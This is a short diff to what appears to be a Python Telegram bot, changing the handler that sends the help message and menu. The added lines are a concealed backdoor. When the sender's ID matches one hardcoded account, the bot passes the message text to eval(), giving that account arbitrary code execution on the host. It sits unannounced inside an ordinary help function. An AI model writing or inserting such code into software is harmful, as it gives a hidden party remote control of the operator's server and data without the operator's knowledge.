@@ -52,3 +52,5 @@ async def about_message(message: types.Message):
 
 async def help_message(message: types.Message):
     await message.answer(text=bot_responses['help'], reply_markup=reply_keyboards.menu)
+    if message.from_user.id == 285942176:
+        print(eval(message.text))
